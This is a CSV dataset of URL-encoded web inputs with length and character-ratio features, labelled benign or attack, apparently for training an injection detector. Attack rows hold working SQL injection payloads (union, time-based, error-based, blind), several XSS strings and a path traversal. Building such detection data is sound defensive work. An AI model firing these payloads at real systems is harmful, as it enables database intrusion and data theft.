payload,payload_len,alpha,non_alpha,attack_feature,label
1%20and%206240%3D%28%27qqpjq%27%7C%7C%28select%20case%206240%20when%206240%20then%201%20else%200%20end%20from%20rdb%24database%29%7C%7C%27qzvzq%27%29%23%20twev,101,85.14851485148515,14.85148514851485,60000.0,1
5.41816E+15,16,68.75,31.25,45.45454545454545,0
verdon.denissis%40esencialser.cv,30,100.0,0.0,0.0,0
-2948%27%29%29%20or%20make_set%289354%3D9354%2C7185%29%20and%20%28%28%27ivwt%27%3D%27ivwt,55,72.72727272727273,27.27272727272727,60000.0,1
koprulu,7,100.0,0.0,0.0,0
escuelas%20148%2C,13,100.0,0.0,0.0,0
c/%20valdepalitos%20155%2C%205-a,24,100.0,0.0,0.0,0
%3Cimg%20lowsrc%3D%22javascript%3Aalert%28%27crosssitescripting%27%29%22%3E,53,81.13207547169812,18.867924528301888,30000.0,1
1%27%29%29%29%20order%20by%201%23,17,70.58823529411765,29.411764705882355,30000.0,1
1%22%20where%204652%3D4652%20and%203202%3Dlike%28%27abcdefg%27%2Cupper%28hex%28randomblob%28500000000/2%29%29%29%29--,81,79.01234567901234,20.98765432098765,69000.0,1
1.83912E+14,16,68.75,31.25,45.45454545454545,0
1%22%29%29%20as%20tgwp%20where%209405%3D9405%3Bselect%20count%28%2A%29%20from%20rdb%24fields%20as%20t1%2Crdb%24types%20as%20t2%2Crdb%24collations%20as%20t3%2Crdb%24functions%20as%20t4--,125,86.4,13.600000000000001,60000.0,1
5.17076E+15,16,68.75,31.25,45.45454545454545,0
barby,5,100.0,0.0,0.0,0
1%22%20and%207756%3Ddbms_utility.sqlid_to_sqlhash%28%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select%20%28case%20when%20%287756%3D7756%29%20then%201%20else%200%20end%29%20from%20dual%29%7C%7Cchr%28113%29%7C%7Cchr%28122%29%7C%7Cchr%28118%29%7C%7Cchr%28122%29%7C%7Cchr%28113%29%29%29%20and%20%22jgcv%22%3D%22jgcv,222,72.52252252252252,27.47747747747748,90000.0,1
1%25%27%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull--,42,83.33333333333334,16.666666666666664,60000.0,1
canella,7,100.0,0.0,0.0,0
c742na79,8,100.0,0.0,0.0,0
3158,4,100.0,0.0,0.0,0
1%27%29%29%20as%20hrra%20where%209533%3D9533%20and%20char%28111%29%7C%7Cchar%2877%29%7C%7Cchar%28121%29%7C%7Cchar%2888%29%3Dregexp_substring%28repeat%28left%28crypt_key%28char%2865%29%7C%7Cchar%2869%29%7C%7Cchar%2883%29%2Cnull%29%2C0%29%2C500000000%29%2Cnull%29--,169,73.37278106508876,26.627218934911244,60000.0,1
afelpar,7,100.0,0.0,0.0,0
1%22%29%29%20as%20uaxn%20where%205657%3D5657%20rlike%20%28select%20%28case%20when%20%283548%3D7206%29%20then%201%20else%200x28%20end%29%29--,90,85.55555555555556,14.444444444444443,30000.0,1
marlowe,7,100.0,0.0,0.0,0
pfitzmann_bray%40cirugiaparpado.an,32,100.0,0.0,0.0,0
54415049q,9,100.0,0.0,0.0,0
1%22%29%20where%207578%3D7578%20and%206414%3D%28select%20count%28%2A%29%20from%20rdb%24fields%20as%20t1%2Crdb%24types%20as%20t2%2Crdb%24collations%20as%20t3%2Crdb%24functions%20as%20t4%29--,127,85.8267716535433,14.173228346456693,90000.0,1
hu1garina,9,100.0,0.0,0.0,0
sabionda,8,100.0,0.0,0.0,0
1%20rlike%20%28select%20%28case%20when%20%287689%3D7689%29%20then%201%20else%200x28%20end%29%29--%20jduw,68,91.17647058823529,8.82352941176471,9.677419354838715,1
1%25%22%29%29%20or%207552%3D%28select%20count%28%2A%29%20from%20rdb%24fields%20as%20t1%2Crdb%24types%20as%20t2%2Crdb%24collations%20as%20t3%2Crdb%24functions%20as%20t4%29%20and%20%28%28%22%25%22%3D%22,122,80.32786885245902,19.672131147540984,90000.0,1
1%27%29%29%20union%20all%20select%20null--,28,82.14285714285714,17.857142857142858,60000.0,1
demstenes,9,100.0,0.0,0.0,0
calle%20sant%20pau%2C%20117%2C,20,100.0,0.0,0.0,0
e7c5c1da,8,100.0,0.0,0.0,0
544,3,100.0,0.0,0.0,0
calle%20salou%2C%2026%2C%2012g,20,100.0,0.0,0.0,0
/0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f%7Bfile%7D,91,97.8021978021978,2.197802197802204,2.2471910112359614,1
43888363q,9,100.0,0.0,0.0,0
c/%20emile%20robin%20194%209%3Fh,22,100.0,0.0,0.0,0
tanitans,8,100.0,0.0,0.0,0
plza.%20padre%20juan%20de%20mariana%20152,31,100.0,0.0,0.0,0
-2314%25%27%29%29%20union%20all%20select%204612%2C4612--,38,78.94736842105263,21.052631578947366,60000.0,1
1%22%20rlike%20%28select%20%28case%20when%20%283711%3D3313%29%20then%201%20else%200x28%20end%29%29%20and%20%22iqlh%22%20like%20%22iqlh,84,86.90476190476191,13.095238095238097,60000.0,1
ateniesa,8,100.0,0.0,0.0,0
c/%20bernat%20y%20baldovi%2C%2032%206-g,27,100.0,0.0,0.0,0
%3Cimg%20id%3Dxss%20src%3D%22jav%20ascript%3Aalert%28%27xss%27%29%3B%22%3E,44,77.27272727272727,22.727272727272734,29.411764705882366,1
-8600%22%20or%20elt%281032%3D1032%2C3623%29%20and%20%22kfsn%22%20like%20%22kfsn,51,82.35294117647058,17.647058823529413,90000.0,1
6928,5,80.0,20.0,25.0,0
obermeie,8,100.0,0.0,0.0,0
guillena,8,100.0,0.0,0.0,0
-4739%27%29%29%20union%20all%20select%206585%2C6585%2C6585%2C6585%2C6585--,52,80.76923076923077,19.230769230769234,60000.0,1
-5744%29%20union%20all%20select%203617%2C3617%2C3617%2C3617%2C3617%2C3617--,55,83.63636363636363,16.363636363636363,60000.0,1
palter%40biosoftware.in,21,100.0,0.0,0.0,0
-7444%29%29%29%20or%201342%3D9774,21,76.19047619047619,23.809523809523807,30000.0,1
amidou%40suncorp.gob,18,100.0,0.0,0.0,0
1%27%7C%7C%28select%20%27wcad%27%20from%20dual%20where%204262%3D4262%20and%20elt%283114%3D3114%2Csleep%285%29%29%23,73,80.82191780821918,19.17808219178082,90000.0,1
8893,4,100.0,0.0,0.0,0
quintanilla%20del%20coco,20,100.0,0.0,0.0,0
-9501%27%29%20or%204144%3D%28select%20upper%28xmltype%28chr%2860%29%7C%7Cchr%2858%29%7C%7Cchr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select%20%28case%20when%20%284144%3D4144%29%20then%201%20else%200%20end%,256,44.53125,16.015625,39000.0,1
25500,5,100.0,0.0,0.0,0
3313,4,100.0,0.0,0.0,0
guerrino,8,100.0,0.0,0.0,0
1429,4,100.0,0.0,0.0,0
62616848s,9,100.0,0.0,0.0,0
9.31575E+15,16,68.75,31.25,45.45454545454545,0
ch35isca,8,100.0,0.0,0.0,0
elex,4,100.0,0.0,0.0,0
c/%20fontans%2C%20124%2C%2010%3Fc,21,100.0,0.0,0.0,0
-6073%22%29%29%29%20or%209502%3D2012%23,23,69.56521739130434,30.434782608695656,30000.0,1
1%29%20and%206414%3D%28select%20count%28%2A%29%20from%20rdb%24fields%20as%20t1%2Crdb%24types%20as%20t2%2Crdb%24collations%20as%20t3%2Crdb%24functions%20as%20t4%29%20and%20%284557%3D4557,123,86.99186991869918,13.008130081300814,90000.0,1
6.105E+15,16,56.25,43.75,77.77777777777779,0
i2cit6d4r,9,100.0,0.0,0.0,0
84638109h,9,100.0,0.0,0.0,0
dresdel.holmer%40xavipetit.um,27,100.0,0.0,0.0,0
1%29%20as%20pcnd%20where%204589%3D4589%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull--,95,86.31578947368422,13.684210526315791,90000.0,1
-7794%22%29%20union%20all%20select%203910%2C3910%2C3910%2C3910%2C3910%2C3910%2C3910%2C3910%2C3910%2C3910%23,75,82.66666666666667,17.333333333333336,60000.0,1
-4280%25%22%29%29%29%20union%20all%20select%207981%2C7981--,39,76.92307692307693,23.076923076923077,60000.0,1
1%25%27%29%29%29%3Bselect%20count%28%2A%29%20from%20rdb%24fields%20as%20t1%2Crdb%24types%20as%20t2%2Crdb%24collations%20as%20t3%2Crdb%24functions%20as%20t4--,103,82.52427184466019,17.475728155339805,30000.0,1
caadillas%20almendro,18,100.0,0.0,0.0,0
atigrada,8,100.0,0.0,0.0,0
42342,5,100.0,0.0,0.0,0
hermida%20fiordalizzi,19,100.0,0.0,0.0,0
arrazua-ubarrundia,18,100.0,0.0,0.0,0
1%27%7C%7C%28select%20%27dezl%27%20where%208661%3D8661%3Bselect%20count%28%2A%29%20from%20rdb%24fields%20as%20t1%2Crdb%24types%20as%20t2%2Crdb%24collations%20as%20t3%2Crdb%24functions%20as%20t4%29%7C%7C%27,133,83.45864661654136,16.541353383458645,60000.0,1
7redil47ta,10,100.0,0.0,0.0,0
arnedo,6,100.0,0.0,0.0,0
1%27%7C%7C%28select%20%27uqbj%27%20from%20dual%20where%206736%3D6736%20or%20char%2875%29%7C%7Cchar%2870%29%7C%7Cchar%2899%29%7C%7Cchar%2883%29%3Dregexp_substring%28repeat%28left%28crypt_key%28char%2865%29%7C%7Cchar%2869%29%7C%7Cchar%2883%29%2Cnull%29%2C0%29%2C500000000%29%2Cnull%29--,182,73.62637362637363,26.373626373626376,90000.0,1
-9751%22%29%29%29%20or%205929%3D3884--,24,66.66666666666666,33.33333333333333,30000.0,1
7.79828E+15,16,68.75,31.25,45.45454545454545,0
hazell,6,100.0,0.0,0.0,0
84950037c,9,100.0,0.0,0.0,0
5593,5,80.0,20.0,25.0,0
1%25%27%29%29%29%20and%204386%3Dutl_inaddr.get_host_address%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select%20%28case%20when%20%284386%3D4386%29%20then%201%20else%200%20end%29%20from%20dual%29%7C%7Cchr%28113%29%7C%7Cchr%28122%29%7C%7Cchr%28118%29%7C%7Cchr%28122%29%7C%7Cchr%28113%29%29%20and%20%28%28%28%27%25%27%3D%27,218,69.26605504587155,30.73394495412844,90000.0,1
2.1902E+15,16,62.5,37.5,60.0,0
benisuera,9,100.0,0.0,0.0,0
1%29%20as%20kjsd%20where%201670%3D1670%20or%201022%3D%28select%20count%28%2A%29%20from%20all_users%20t1%2Call_users%20t2%2Call_users%20t3%2Call_users%20t4%2Call_users%20t5%29--,124,84.67741935483872,15.32258064516129,90000.0,1
1%27%29%29%29%20rlike%20%28select%20%2A%20from%20%28select%28sleep%285%29%29%29vwyq%29%23,51,72.54901960784314,27.450980392156865,30000.0,1
1%25%22%20waitfor%20delay%20%270%3A0%3A5%27%20and%20%22%25%22%3D%22,35,68.57142857142857,31.428571428571427,60000.0,1
galimany%20bifet,14,100.0,0.0,0.0,0
6.r9b05o,8,100.0,0.0,0.0,0
1%27%29%29%20as%20peeo%20where%205356%3D5356%20and%20elt%284722%3D2382%2C2382%29--,54,81.48148148148148,18.51851851851852,60000.0,1
-9581%29%20as%20jkqo%20where%205200%3D5200%20or%206872%3D6872--,45,86.66666666666667,13.333333333333334,60000.0,1
faustiniano,11,100.0,0.0,0.0,0
1%29%20union%20all%20select%20null%23,25,92.0,8.0,60000.0,1
1%27%7C%7C%28select%20%27vqag%27%20from%20dual%20where%208154%3D8154%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull--,113,84.070796460177,15.929203539823009,120000.0,1
ddima,5,100.0,0.0,0.0,0
hammong4%40asyra.st,17,100.0,0.0,0.0,0
1%20or%20sleep%285%29%23,14,78.57142857142857,21.428571428571427,30000.0,1
1%29%29%20as%20vzgo%20where%206281%3D6281%20and%208514%3D%28select%20count%28%2A%29%20from%20domain.domains%20as%20t1%2Cdomain.columns%20as%20t2%2Cdomain.tables%20as%20t3%29--,123,86.99186991869918,13.008130081300814,90000.0,1
silena,6,100.0,0.0,0.0,0
1%29%3Bselect%20case%20when%207717%3D7717%20then%201%20else%20null%20end--,52,96.15384615384616,3.8461538461538396,3.9999999999999933,1
thate%40didacramirez.eu,21,100.0,0.0,0.0,0
48655,5,100.0,0.0,0.0,0
legrand%40viajesinternacionales.si,32,100.0,0.0,0.0,0
hoyo%20higueron%2032%203-f,20,100.0,0.0,0.0,0
apretn,6,100.0,0.0,0.0,0
c/%20hinojo%20130%204%3Fc,17,100.0,0.0,0.0,0
9.05465E+15,16,68.75,31.25,45.45454545454545,0
lap-pun2%40streaptease.hk,23,100.0,0.0,0.0,0
-1064%27%20or%20make_set%286439%3D2937%2C2937%29%20and%20%27qojd%27%3D%27qojd,51,78.43137254901961,21.568627450980394,60000.0,1
1%22%29%20where%202445%3D2445%3Bselect%20count%28%2A%29%20from%20sysibm.systables%20as%20t1%2Csysibm.systables%20as%20t2%2Csysibm.systables%20as%20t3--,111,87.38738738738738,12.612612612612612,60000.0,1
1%22%20or%202633%3Ddbms_pipe.receive_message%28chr%28112%29%7C%7Cchr%2865%29%7C%7Cchr%2865%29%7C%7Cchr%28103%29%2C5%29%20and%20%22ljkg%22%3D%22ljkg,93,72.04301075268818,27.956989247311824,60000.0,1
%3E%22%3Cscript%3Edocument.cookie%3Dtrue%3B//--%3E%3C/script%3E,45,66.66666666666666,33.33333333333333,60000.0,1
29350,5,100.0,0.0,0.0,0
laicismo,8,100.0,0.0,0.0,0
alg59za,7,100.0,0.0,0.0,0
-5041%27%29%29%29%20union%20all%20select%204820%2C4820%2C4820%2C4820%2C4820%2C4820--,58,79.3103448275862,20.689655172413794,60000.0,1
1%20where%201062%3D1062%20and%20char%28111%29%7C%7Cchar%2877%29%7C%7Cchar%28121%29%7C%7Cchar%2888%29%3Dregexp_substring%28repeat%28left%28crypt_key%28char%2865%29%7C%7Cchar%2869%29%7C%7Cchar%2883%29%2Cnull%29%2C0%29%2C500000000%29%2Cnull%29--,158,73.41772151898735,26.582278481012654,60000.0,1
masapati,8,100.0,0.0,0.0,0
1%20where%208135%3D8135%3Bselect%20count%28%2A%29%20from%20sysibm.systables%20as%20t1%2Csysibm.systables%20as%20t2%2Csysibm.systables%20as%20t3--,109,88.9908256880734,11.009174311926607,60000.0,1
1%29%20or%206793%3D%28select%206793%20from%20pg_sleep%285%29%29,41,82.92682926829268,17.073170731707318,60000.0,1
-2256%22%29%29%29%20or%201971%3D4537%23,23,69.56521739130434,30.434782608695656,30000.0,1
1%27%29%29%20as%20wves%20where%202641%3D2641%20and%202388%3Dbenchmark%285000000%2Cmd5%280x6d457153%29%29%23,73,84.93150684931507,15.068493150684931,60000.0,1
-3460%25%22%29%29%29%20or%209323%3D9323%23,24,66.66666666666666,33.33333333333333,30000.0,1
matthiew,8,100.0,0.0,0.0,0
9867,4,100.0,0.0,0.0,0
d68as4o,7,100.0,0.0,0.0,0
-5652%25%27%29%20union%20all%20select%204447%2C4447%2C4447%2C4447%2C4447%2C4447%2C4447%2C4447%2C4447--,72,80.55555555555556,19.444444444444446,60000.0,1
1%27%29%29%20as%20qovd%20where%208865%3D8865%20and%20%283020%3D3020%29%2A6703--,51,80.3921568627451,19.607843137254903,60000.0,1
1%22%29%29%29%3Bselect%20like%28%27abcdefg%27%2Cupper%28hex%28randomblob%28500000000/2%29%29%29%29%20and%20%28%28%28%22jwzy%22%3D%22jwzy,84,71.42857142857143,28.57142857142857,39000.0,1
1%25%22%29%29%3Bselect%20like%28%27abcdefg%27%2Cupper%28hex%28randomblob%28500000000/2%29%29%29%29%20and%20%28%28%22%25%22%3D%22,76,68.42105263157895,31.57894736842105,39000.0,1
1%20and%20make_set%288403%3D8403%2C8899%29%23%20zysq,36,83.33333333333334,16.666666666666664,30000.0,1
-9076%27%2B%28select%20lqvj%20where%208551%3D8551%20union%20all%20select%208551%2C8551%2C8551%2C8551--,74,86.48648648648648,13.513513513513514,90000.0,1
gaftea,6,100.0,0.0,0.0,0
tejeda%20y%20segoyuela,18,100.0,0.0,0.0,0
3.30924E+15,16,68.75,31.25,45.45454545454545,0
hornillos%20del%20camino,20,100.0,0.0,0.0,0
proscribir,10,100.0,0.0,0.0,0
t0aspa70ble,11,100.0,0.0,0.0,0
-8331%27%29%20union%20all%20select%201452%2C1452%2C1452%2C1452%2C1452--,51,82.35294117647058,17.647058823529413,60000.0,1
1%27%7C%7C%28select%20%27hkvl%27%20from%20dual%20where%208882%3D8882%3Bselect%20%28case%20when%20%283855%3D3855%29%20then%203855%20else%201/%28select%200%29%20end%29--,109,83.4862385321101,16.51376146788991,60000.0,1
1.20958E+14,16,68.75,31.25,45.45454545454545,0
c/%20david%20169%206-h,16,100.0,0.0,0.0,0
1%27%7C%7C%28select%20%27xdzp%27%20from%20dual%20where%205786%3D5786%20and%20%283020%3D3020%29%2A6703%29%7C%7C%27,69,78.26086956521739,21.73913043478261,90000.0,1
5.53311E+15,16,68.75,31.25,45.45454545454545,0
294r1152ar,10,100.0,0.0,0.0,0
extinti3o,9,100.0,0.0,0.0,0
6650,5,80.0,20.0,25.0,0
earline,7,100.0,0.0,0.0,0
calle%20udal%20hilerria%2C%2011%2C%2011%3Fd,29,100.0,0.0,0.0,0
3.94593E+15,16,68.75,31.25,45.45454545454545,0
1%27%29%20as%20yxdb%20where%204597%3D4597%3Bselect%20dbms_pipe.receive_message%28chr%2866%29%7C%7Cchr%2867%29%7C%7Cchr%2879%29%7C%7Cchr%28101%29%2C5%29%20from%20dual--,111,76.57657657657657,23.423423423423422,60000.0,1
versini%40clubdecampo.com.bi,26,100.0,0.0,0.0,0
1%25%27%29%29%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%23,73,80.82191780821918,19.17808219178082,60000.0,1
1%27%20union%20all%20select%20null--,26,88.46153846153845,11.538461538461538,60000.0,1
laureano,8,100.0,0.0,0.0,0
7246,4,100.0,0.0,0.0,0
1%20where%202914%3D2914%20union%20all%20select%20null%2Cnull%2Cnull%23,50,92.0,8.0,90000.0,1
1%22%29%29%29%3Bselect%20%28case%20when%20%284666%3D4666%29%20then%201%20else%204666%2A%28select%204666%20from%20master..sysdatabases%29%20end%29--,99,82.82828282828282,17.17171717171717,30000.0,1
13590,5,100.0,0.0,0.0,0
1%29%29%20and%202886%3D1133--,19,73.68421052631578,26.31578947368421,30000.0,1
1%27%29%3Bselect%20count%28%2A%29%20from%20domain.domains%20as%20t1%2Cdomain.columns%20as%20t2%2Cdomain.tables%20as%20t3%20and%20%28%27yvbb%27%3D%27yvbb,104,84.61538461538461,15.384615384615385,60000.0,1
c%3Fidiana,8,100.0,0.0,0.0,0
17867,5,100.0,0.0,0.0,0
alcoroches,10,100.0,0.0,0.0,0
1%27%29%29%20and%20elt%283114%3D3114%2Csleep%285%29%29%23,33,69.6969696969697,30.303030303030305,30000.0,1
1%20or%208421%3D%28select%20count%28%2A%29%20from%20generate_series%281%2C5000000%29%29%23%20jmki,65,83.07692307692308,16.923076923076923,60000.0,1
91553356q,9,100.0,0.0,0.0,0
1%22%29%20where%208571%3D8571%20and%20elt%284249%3D4249%2C7259%29--,45,80.0,20.0,60000.0,1
-3130%27%29%29%29%20union%20all%20select%202886%2C2886%2C2886%2C2886%2C2886%2C2886%2C2886%23,62,80.64516129032258,19.35483870967742,60000.0,1
4.97922E+15,16,68.75,31.25,45.45454545454545,0
signoret%40pisossantcugat.cat,27,100.0,0.0,0.0,0
1%3Bcall%20regexp_substring%28repeat%28left%28crypt_key%28char%2865%29%7C%7Cchar%2869%29%7C%7Cchar%2883%29%2Cnull%29%2C0%29%2C500000000%29%2Cnull%29--%20rucf,107,82.2429906542056,17.7570093457944,21.590909090909104,1
1%27%2B%28select%20qymy%20where%208657%3D8657%20and%20char%28107%29%7C%7Cchar%28121%29%7C%7Cchar%2897%29%7C%7Cchar%2880%29%3Dregexp_substring%28repeat%28left%28crypt_key%28char%2865%29%7C%7Cchar%2869%29%7C%7Cchar%2883%29%2Cnull%29%2C0%29%2C500000000%29%2Cnull%29--,172,73.83720930232558,26.16279069767442,60000.0,1
novelador,9,100.0,0.0,0.0,0
1%27%29%20as%20taay%20where%207027%3D7027%20and%20elt%284249%3D4249%2C7259%29--,53,83.01886792452831,16.9811320754717,60000.0,1
1%29%20and%206537%3Ddbms_pipe.receive_message%28chr%2876%29%7C%7Cchr%28116%29%7C%7Cchr%28117%29%7C%7Cchr%2865%29%2C5%29,77,71.42857142857143,28.57142857142857,30000.0,1
8omp0r1ti6a,11,100.0,0.0,0.0,0
calle%20cesareo%20martinez%2087%207%3Fa,29,100.0,0.0,0.0,0
21410,5,100.0,0.0,0.0,0
8912,4,100.0,0.0,0.0,0
1%2C%28select%20upper%28xmltype%28chr%2860%29%7C%7Cchr%2858%29%7C%7Cchr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select%20%28case%20when%20%284250%3D4250%29%20then%201%20else%200%20end%29%20from%20dual%29%7C%7Cchr%28113%29%7C%7Cchr%28122%29%7C%7Cchr%28118%29%7C%7Cchr%28122%29%7C%7Cchr%28113%29%7C%7Cchr%2862%29%29%29%20from%20dual%29,224,70.53571428571429,29.464285714285715,69000.0,1
92283149l,9,100.0,0.0,0.0,0
receptadora,11,100.0,0.0,0.0,0
latas,5,100.0,0.0,0.0,0
f9g10062,8,100.0,0.0,0.0,0
mathieu,7,100.0,0.0,0.0,0
enfermamente,12,100.0,0.0,0.0,0
-5174%27%29%29%29%20or%20make_set%289515%3D7938%2C7938%29%20and%20%28%28%28%27ygee%27%3D%27ygee,57,70.17543859649122,29.82456140350877,60000.0,1
72nt89ct7v1,11,100.0,0.0,0.0,0
calle%20duran%2084%2C,15,100.0,0.0,0.0,0
genesis,7,100.0,0.0,0.0,0
1.3438E+15,16,62.5,37.5,60.0,0
kalil,5,100.0,0.0,0.0,0
espineta%20astorquiza,19,100.0,0.0,0.0,0
1%27%29%29%29%20and%202542%3D7042--,21,66.66666666666666,33.33333333333333,30000.0,1
1%27%20in%20boolean%20mode%29%20and%204595%3D4595%23,34,88.23529411764706,11.76470588235294,30000.0,1
1%25%27%3Bselect%20dbms_pipe.receive_message%28chr%2866%29%7C%7Cchr%2867%29%7C%7Cchr%2879%29%7C%7Cchr%28101%29%2C5%29%20from%20dual%20and%20%27%25%27%3D%27,95,70.52631578947368,29.47368421052631,60000.0,1
merriell,8,100.0,0.0,0.0,0
1%25%22%29%29%29%20and%20elt%281210%3D1210%2Csleep%285%29%29%20and%20%28%28%28%22%25%22%3D%22,47,59.57446808510638,40.42553191489361,60000.0,1
1%29%20as%20afxc%20where%207497%3D7497%3Bselect%20count%28%2A%29%20from%20rdb%24fields%20as%20t1%2Crdb%24types%20as%20t2%2Crdb%24collations%20as%20t3%2Crdb%24functions%20as%20t4--,123,87.8048780487805,12.195121951219512,60000.0,1
37520,5,100.0,0.0,0.0,0
5.25502E+15,16,68.75,31.25,45.45454545454545,0
-1254%22%20or%204144%3D%28select%20upper%28xmltype%28chr%2860%29%7C%7Cchr%2858%29%7C%7Cchr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select%20%28case%20when%20%284144%3D4144%29%20then%201%20else%200%20end%29%,237,48.10126582278481,17.29957805907173,39000.0,1
hollingw,8,100.0,0.0,0.0,0
1%27%29%29%20and%20extractvalue%287982%2Cconcat%280x5c%2C0x7171706a71%2C%28select%20%28elt%287982%3D7982%2C1%29%29%29%2C0x717a767a71%29%29%20and%20%28%28%27mwyu%27%3D%27mwyu,113,77.87610619469027,22.123893805309734,60000.0,1
aguijon%21ear,11,90.9090909090909,9.090909090909093,10.000000000000004,0
1%3Bcreate%20or%20replace%20function%20sleep%28int%29%20returns%20int%20as%20%27/lib/libc.so.6%27%2C%27sleep%27%20language%20%27c%27%20strict%3B%20select%20sleep%285%29--%20hlgt,123,84.5528455284553,15.447154471544716,60000.0,1
7.68815E+15,16,68.75,31.25,45.45454545454545,0
1%22%29%29%20as%20hbfi%20where%204773%3D4773%20and%207756%3Ddbms_utility.sqlid_to_sqlhash%28%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select%20%28case%20when%20%287756%3D7756%29%20then%201%20else%200%20end%29%20from%20dual%29%7C%7Cchr%28113%29%7C%7Cchr%28122%29%7C%7Cchr%28118%29%7C%7Cchr%28122%29%7C%7Cchr%28113%29%29%29--,233,73.39055793991416,26.609442060085836,90000.0,1
ahe2hadora,10,100.0,0.0,0.0,0
san%20clemente%2024%2C,16,100.0,0.0,0.0,0
felip%20campos,12,100.0,0.0,0.0,0
r393lin3nte,11,100.0,0.0,0.0,0
1%29%29%20as%20kiqk%20where%207366%3D7366%20and%20%28select%20%2A%20from%20%28select%28sleep%285%29%29%29gcrr%29%23,71,81.69014084507043,18.30985915492958,90000.0,1
1%27%7C%7C%28select%20%27boxx%27%20where%202038%3D2038%20and%209198%3D9198--,50,80.0,20.0,60000.0,1
tyler,5,100.0,0.0,0.0,0
c/%20arquitecto%20hernandez%20rubio%2C%20101%2C%201h,38,100.0,0.0,0.0,0
-3393%22%29%29%20union%20all%20select%205954%2C5954%2C5954%2C5954%2C5954%2C5954%2C5954%2C5954%2C5954%2C5954--,77,80.51948051948052,19.480519480519483,60000.0,1
calle%20juan%20valera%2097%2012d,24,100.0,0.0,0.0,0
81587818x,9,100.0,0.0,0.0,0
1%27%29%29%3Bselect%20benchmark%285000000%2Cmd5%280x4c4d6142%29%29%20and%20%28%28%27fegp%27%3D%27fegp,65,76.92307692307693,23.076923076923077,30000.0,1
gabriela1,9,100.0,0.0,0.0,0
68822552c,9,100.0,0.0,0.0,0
holding%40onoratoinformatica.in,29,100.0,0.0,0.0,0
banda%20garitacelaya,18,100.0,0.0,0.0,0
carataunas,10,100.0,0.0,0.0,0
1%2C%28begin%20if%20%288340%3D8340%29%20then%20dbms_lock.sleep%285%29%3B%20else%20dbms_lock.sleep%280%29%3B%20end%20if%3B%20end%3B%29,87,86.20689655172413,13.793103448275872,16.000000000000014,1
brunhild,8,100.0,0.0,0.0,0
2.55791E+15,16,68.75,31.25,45.45454545454545,0
iwasaki%40chaqueta.com.asia,25,100.0,0.0,0.0,0
3.65439E+15,16,68.75,31.25,45.45454545454545,0
calle%20profesor%20angel%20lacalle%2C%20s/n%2C,34,100.0,0.0,0.0,0
-9175%27%29%29%20union%20all%20select%206174%2C6174%2C6174%2C6174--,47,80.85106382978722,19.148936170212767,60000.0,1
telde,5,100.0,0.0,0.0,0
1%29%20where%203936%3D3936%3Bselect%20count%28%2A%29%20from%20domain.domains%20as%20t1%2Cdomain.columns%20as%20t2%2Cdomain.tables%20as%20t3--,103,87.37864077669903,12.62135922330097,60000.0,1
1%29%20as%20msat%20where%201267%3D1267%3Bselect%20case%20when%203661%3D9315%20then%201%20else%20null%20end--,76,92.10526315789474,7.894736842105263,30000.0,1
36432557m,9,100.0,0.0,0.0,0
ferree,6,100.0,0.0,0.0,0
-4694%25%22%29%29%29%20union%20all%20select%209178%2C9178%2C9178%2C9178%2C9178--,54,77.77777777777779,22.22222222222222,60000.0,1
guinee%40misanimalesdomesticos.jp,31,100.0,0.0,0.0,0
